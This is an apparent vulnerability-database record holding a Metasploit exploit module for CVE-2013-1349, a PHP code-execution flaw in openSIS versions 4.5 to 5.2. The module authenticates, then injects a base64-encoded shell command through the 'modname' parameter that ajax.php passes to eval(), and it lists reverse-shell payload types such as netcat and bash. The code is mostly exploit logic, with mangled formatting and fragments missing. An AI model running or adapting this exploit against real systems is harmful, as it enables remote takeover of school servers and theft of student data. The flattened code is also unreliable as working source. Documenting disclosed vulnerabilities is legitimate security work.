{
    "text": "vul_name : openSIS 5.2 'modname' PHP Code Execution Exploit ， vul_cve : CVE-2013-1349 ， vul_poc :  ，  # This module requires Metasploit : http/metasploit.com/download ，  # Current source :  ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， super ( update_info ( info ,  ， 'Name' => \"OpenSIS 'modname' PHP Code Execution\" ,  ， 'Description' => %q{ ， This module exploits a PHP code execution vulnerability in OpenSIS ， versions 4.5 to 5.2 which allows any authenticated user to execute ， arbitrary PHP code under the context of the web-server user. ， The 'ajax.php' file calls 'eval (  ) ' with user controlled data from ， the 'modname' parameter. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'EgiX' ,  # Discovery ， 'Brendan Coles <bcoles [ at ] gmail.com>' # msf exploit ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2013-1349' ]  ,  ，  [ 'OSVDB' , '100676' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'Payload' => ， { ， 'BadChars' => \"\\x00\\x0a\\x0d\" ,  ， 'Compat' => ， { ， 'PayloadType' => 'cmd' ,  ， 'RequiredCmd' => 'generic telnet bash netcat netcat-e perl ruby python' ,  ， } ， } ,  ， 'DefaultOptions' => ， { ， 'ExitFunction' => 'none' ， } ,  ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Targets' => ，  [  ，  # Tested on OpenSIS versions 4.9 and 5.2 ( Ubuntu Linux )  ，  [ 'OpenSIS version 4.5 to 5.2' , { 'auto' => true } ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => 'Dec 04 2012' ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The URI for OpenSIS' , '/opensis/' ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ true , 'The username for OpenSIS' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'The password for OpenSIS' ]  )  ，  ]  , self.class )  ， end ，  # Login ，  @ cookie = \"PHPSESSID= # {rand_text_alphanumeric ( rand ( 10 ) +10 ) } ; \" ， print_status ( \" # {peer} - Authenticating as user ' # {user}'\" )  ， res = send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => normalize_uri ( target_uri.path , \"index.php\" )  ,  ， 'cookie' => @ cookie ,  ， 'vars_post' => Hash [ { ， 'USERNAME' => user ,  ， 'PASSWORD' => pass ,  ， }.to_a.shuffle ]  ， } )  ， print_good ( \" # {peer} - Authenticated as user ' # {user}'\" )  ， print_error ( \" # {peer} - Authenticating as user ' # {user}' failed\" )  ， end ， end ，  # Send command for execution ， code = Rex : Text.uri_encode ( Rex : Text.encode_base64 ( cmd+\"&\" )  ， junk = rand_text_alphanumeric ( rand ( 10 ) +6 )  ， print_status ( \" # {peer} - Sending payload (  # {code.length} bytes ) \" )  ， res = send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => normalize_uri ( target_uri.path , 'ajax.php' )  ,  ， 'cookie' => @ cookie ,  ， 'vars_post' => { ， 'modname' => \" # {junk}? # {junk}= # {junk}' ;  # {opts [  : php_function ] } ( base64_decode ( ' # {code}' )  ; /\" ， } ， } )  ， end ，  # Check credentials are valid and confirm command execution ， def check",
    "time": "2013.12.24"
}